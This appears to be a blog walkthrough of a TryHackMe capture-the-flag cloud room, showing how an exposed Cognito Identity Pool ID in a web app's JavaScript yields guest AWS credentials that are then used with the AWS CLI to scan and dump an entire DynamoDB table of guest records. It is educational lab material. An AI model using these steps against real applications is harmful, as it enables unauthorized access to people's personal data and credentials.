
I just finished Day 3 of TryHackMe’s Hacker Holidays event (**The Byte Lotus Hotel: Complimentary**). It’s marked as an Easy cloud challenge.

If you’re currently trying to figure out AWS Cognito or DynamoDB, or if you just want to see a rookie stumble their way into a full-on data leak, here is my detailed, chaotic walkthrough of how I solved it!

### The Story (Why are we doing this?)

The scenario introduces us to a hotel guest named Lambo (`@0xMia`). She downloads the hotel’s free wellness app just to score a free tote bag. Naturally, she hits "Allow" on every terrifying permission prompt—camera, microphone, contacts, GPS—all for that sweet merch.

But then things get weird. The second she opens the app, it greets her by name... except she never made an account, and there’s no login screen anywhere.

She posts a story on social media saying:

> _"Something has to be quietly handing it access behind the scenes... if you find whatever that something is, don't just check what it gives YOU. Ask it for more 👀"_

So our game plan is simple:

1. Find whatever is handing out secret keys in the background.
2. Use those keys to poke around the database directly.
3. Steal the flag buried in the data

---
### Step 1: Right-Clicking My Way to Victory

I started by opening up the target web page provided in the room. It loaded a clean dashboard page saying _"Loading your dashboard..."_.

Since the briefing hinted that something sneaky was happening behind the scenes, I did the classic move: right-clicked the page, hit **Inspect**, and jumped over to the **Sources** tab to check out the JavaScript files.

I found `app.js`, and the developers literally left a massive comment explaining the entire security flaw for anyone reading:


```JavaScript
// No login screen on purpose: every visitor gets "free" AWS guest
// credentials from our Cognito Identity Pool so we can save wellness
// preferences without the friction of an account.
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

To eliminate user friction, they configured Amazon Cognito Identity Pools to hand out real, live AWS credentials to every single person who hits the website.

Looking further down the file, the app generates a random `guest_id`, saves it to browser local storage, and then runs a query to fetch _only_ that specific ID. The developers assumed that because their frontend UI only asks for one row, users wouldn't be able to request anything else.

---

### Step 2: Figuring Out the AWS CLI

Armed with the `IDENTITY_POOL_ID`, I needed to use the AWS CLI in my terminal to grab those guest credentials. Since I'm still pretty new to cloud tools, I had to look up the exact commands.

First, I asked Cognito to generate an Identity ID token:
```Bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
  --region us-east-1
```
This returned a short JSON response containing an ID string starting with `us-east-1:...`.


Next, I traded that ID string for actual temporary session credentials:

```Bash
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:4d571309-b0f2-c356-307d-18f59d766657" \
  --region us-east-1
```

My terminal printed out a JSON object packed with an `AccessKeyId`, a `SecretKey`, and a very long `SessionToken`.

---
### Step 3: Becoming the App (And Dumping the Table)

To use these keys, I exported them as environment variables in my Linux session:

```Bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYJQN3OVCY"
export AWS_SECRET_ACCESS_KEY="/U85aTpT0xED+Kw4IXDkQlrkkNO9o34SKguMDm4+"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELr//////////wEaCXVz..."
export AWS_DEFAULT_REGION="us-east-1"
```

Now, any `aws` command I ran in terminal made the AWS backend think I was the mobile app client.

The actual web app used `getItem` to look up single records. But remembering Mia's advice to _"ask it for more"_, I decided to run a `scan` command, which instructs DynamoDB to dump every entry in the table:

```Bash
aws dynamodb scan --table-name "complimentary-GuestWellnessProfiles"
```

I hit Enter expecting an `Access Denied` error... but it actually worked!

The terminal dumped the entire guest database—phone numbers, GPS coordinates, plaintext passwords, and personal notes. Tucked inside the last profile was the challenge flag:

```JSON
{
  "password": { "S": "escalation_only" },
  "notes": {
      "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{XXXX_XXX_XXXX_XXXX!}"
  }
}
```

Flag captured !!
